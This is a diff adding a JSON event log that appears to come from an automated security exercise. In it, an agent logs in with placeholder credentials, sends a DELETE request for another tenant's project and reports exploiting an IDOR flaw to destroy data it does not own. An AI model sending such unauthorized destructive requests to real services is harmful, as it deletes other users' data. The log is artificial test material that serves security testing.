@@ -1,0 +1,52 @@
+[
+  {
+    "event_id": "evt_7905c4b1f734478b9cb39334e55336c5",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": {
+        "email": "user_88705576@exercise.invalid",
+        "password": "pw_b5b62be6a1e61f3f"
+      },
+      "method": "POST",
+      "path": "/auth/login",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "event_id": "evt_31fef19d0e2f4fe58860a3984b336d2b",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": null,
+      "method": "DELETE",
+      "path": "/v1/projects/2d3528e7-a948-445f-9f3a-1ac7c26eed67",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "event_id": "evt_8adb31569505480fbba37cf38e0a40af",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "path": "/v1/projects",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "status": "success",
+    "summary": "Signed in as user_88705576@exercise.invalid and exploited the broken object-level authorization (IDOR) vulnerability by sending DELETE /v1/projects/2d3528e7-a948-445f-9f3a-1ac7c26eed67. The service returned 200 OK, deleting a project owned by a different tenant without verifying ownership.",
+    "type": "finish"
+  }
+]
